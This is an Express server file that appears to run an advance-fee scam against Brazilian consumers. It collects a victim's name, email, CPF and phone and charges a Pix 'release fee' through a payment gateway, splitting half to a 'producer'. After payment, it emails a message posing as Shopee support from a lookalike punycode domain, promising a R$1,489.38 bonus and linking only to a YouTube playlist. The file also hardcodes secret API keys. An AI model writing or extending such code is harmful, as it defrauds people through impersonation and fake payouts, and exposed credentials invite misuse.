import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend'; // <-- ACRESCENTADO

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// ACRESCENTADO: CONFIGURAÇÃO DO RESEND
const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');

async function enviarAcessoCurso(emailCliente, nomeCliente) {
  try {
    await resend.emails.send({
      from: 'Suporte Shopee <contato@xn--seubnushopp-5eb.com>', 
      to: emailCliente,
      subject: 'Seu acesso chegou! 🚀 Resgate de Bonificação Shopee',
      html: `
        <div style="font-family: sans-serif; max-width: 600px; border: 1px solid #eee; padding: 20px; border-radius: 10px;">
          <h2 style="color: #333;">Olá, ${nomeCliente}! 🎉</h2>
          <p style="font-size: 16px; color: #555;">Informamos que sua bonificação no programa da Shopee foi processada com sucesso.</p>
          <p style="font-size: 16px; color: #555;">O valor de <strong style="color: #1f9c6b;">R$ 1.489,38</strong> está aguardando você.</p>
          <p style="font-size: 16px; color: #555;">Clique no botão abaixo para acessar o guia de resgate e as aulas exclusivas imediatamente:</p>
          
          <div style="text-align: center; margin: 30px 0;">
            <a href="https://www.youtube.com/playlist?list=PLUvZw3_AgGShs94tp72Bh8WMzr1WrAOJC" 
               style="background: #1f9c6b; color: white; padding: 18px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
              ACESSAR MINHAS AULAS AGORA
            </a>
          </div>

          <p style="font-size: 14px; color: #777; border-top: 1px solid #eee; pt: 15px;">
            <strong>Dica:</strong> Se o botão não funcionar, copie e cole o link abaixo no seu navegador:<br>
            https://www.youtube.com/playlist?list=PLUvZw3_AgGShs94tp72Bh8WMzr1WrAOJC
          </p>
          
          <p style="font-size: 12px; color: #999; margin-top: 20px;">Equipe de Liberação | Shopee Brasil</p>
        </div>
      `
    });
    console.log(`📧 E-mail invisível enviado com sucesso para: ${emailCliente}`);
  } catch (error) {
    console.error("❌ Erro ao disparar e-mail pelo Resend:", error);
  }
}
// =====================================================

// =====================================================
// 🔴 SUAS CHAVES DA VIZZION PAY (AGORA ESTÁ 100% CORRETO)
const SECRET_KEY = "e08f7qe1x8zjbnx4dkra9p8v7uj1wfacwidsnnf4lhpfq3v8oz628smahn8g6kus"; 
const PUBLIC_KEY = "rodrigogato041_glxgrxj8x8yy8jo2";
// =====================================================

const bancoTransacoes = new Map();

app.use(express.static(path.resolve())); 
app.get('/', (req, res) => {
    res.sendFile(path.resolve('index.html'));
});

const formatCpf = (v: string) => v.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
const formatPhone = (v: string) => v.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");

// 👉 A MÁGICA: O RASTREADOR UNIVERSAL DE PIX COPIA E COLA
function acharCopiaECola(obj: any): string | null {
    if (typeof obj === 'string' && obj.startsWith('000201')) return obj;
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const result = acharCopiaECola(obj[key]);
            if (result) return result;
        }
    }
    return null;
}

// =====================================================
// ROTA 1: GERA O PIX
// =====================================================
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor } = req.body;

        const valorFixo = parseFloat(valor) || 79.10; 
        const identifier = `ID${Date.now()}`;
        const amanha = new Date();
        amanha.setDate(amanha.getDate() + 1);
        const dueDateStr = amanha.toISOString().split('T')[0];
        const percentualProdutor = 0.50; //50% para o produtor
        const valorProdutor = parseFloat((valorFixo * percentualProdutor).toFixed(2));

        const payload = {
            identifier: identifier,
            amount: valorFixo,
            client: { 
                name: name || "Cliente", 
                email: email || "cliente@email.com", 
                phone: formatPhone(phone || "11999999999"), 
                document: formatCpf(cpf || "00000000000") 
            },
            products: [
                { 
                    id: "TAXA_01", 
                    name: "Taxa de Liberação", 
                    quantity: 1, 
                    price: valorFixo 
                }
            ],
            splits: [
                {
                    producerId: "cmg7bvpns00u691tsx9g6vlyp",
                    amount: valorProdutor
                }
            ],
            dueDate: dueDateStr,
            metadata: { provedor: "Sistema Pix" },
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        // ACRESCENTADO: Salvando o e-mail e nome do cliente para usar no disparo depois
        bancoTransacoes.set(identifier, { status: 'pending', amount: valorFixo, emailCliente: payload.client.email, nomeCliente: payload.client.name });

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 
                'x-public-key': PUBLIC_KEY,
                'x-secret-key': SECRET_KEY,
                'Content-Type': 'application/json'
            }
        });

        // SUGANDO OS DADOS DA VIZZION PAY
        const pixData = response.data.pix || response.data || {};
        const imagemPix = pixData.encodedImage || pixData.qrcode_image || pixData.image || response.data.encodedImage || "";
        
        // O Rastreador vai vasculhar TUDO procurando o código "000201"
        const codigoPix = acharCopiaECola(response.data) || "Erro: Copia e Cola não encontrado na API";

        console.log("✅ PIX GERADO! Código e Imagem capturados com sucesso.");

        return res.json({ 
            success: true, 
            payload: codigoPix, // Manda o código rastreado pra tela
            encodedImage: imagemPix,
            transactionId: identifier 
        });

    } catch (error: any) {
        const erroReal = error.response?.data ? JSON.stringify(error.response.data) : error.message;
        console.error("❌ Erro Vizzion:", erroReal);
        return res.status(error.response?.status || 401).json({ 
            success: false, 
            message: `Erro Vizzion: ${erroReal}` 
        });
    }
});

// =====================================================
// ROTA 2: WEBHOOK (O AVISO DE PAGAMENTO)
// =====================================================
app.post('/webhook', (req, res) => {
    const { event, transaction } = req.body;

    if (!transaction) {
        return res.status(400).send("Invalid payload");
    }

    const {
        id,
        identifier,
        status,
        paymentMethod,
        amount
    } = transaction;

    const idBusca = identifier || id;

    if (
        paymentMethod === 'PIX' &&
        status === 'COMPLETED' &&
        event === 'TRANSACTION_PAID'
    ) {
        if (bancoTransacoes.has(idBusca)) {
            const transacao = bancoTransacoes.get(idBusca);

            if (Number(transacao.amount) === Number(amount)) {
                bancoTransacoes.set(idBusca, {
                    ...transacao, // Mantém os dados antigos (email e nome)
                    status: 'paid',
                    amount: amount
                });

                console.log(`💰 PAGAMENTO CONFIRMADO! Transação: ${idBusca}`);

                // =====================================================
                // ACRESCENTADO: DISPARO FANTASMA DO E-MAIL AQUI
                if (transacao.emailCliente) {
                    enviarAcessoCurso(transacao.emailCliente, transacao.nomeCliente);
                }
                // =====================================================

                axios.get('https://api.pushcut.io/KnUVBiCa-4A0euJ42eJvj/notifications/MinhaNotifica%C3%A7%C3%A3o')
                    .then(() => {
                        console.log('🔔 Notificação enviada com sucesso');
                    })
                    .catch(err => {
                        console.error('❌ Erro ao enviar notificação:', err.message);
                    });

            } else {
                console.log(`⚠️ Valor divergente no webhook`);
            }
        } else {
            console.log(`⚠️ Transação não encontrada: ${idBusca}`);
        }
    }

    return res.status(200).send("OK");
});

// =====================================================
// ROTA 3: POLLING (O REDIRECIONAMENTO AUTOMÁTICO)
// =====================================================
app.get('/check-status/:id', (req, res) => {
    const id = req.params.id;
    const transacao = bancoTransacoes.get(id);

    if (transacao && transacao.status === 'paid') {
        return res.json({ paid: true }); 
    } else {
        return res.json({ paid: false }); 
    }
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Servidor da Vizzion com Chave Dupla Rodando!"));
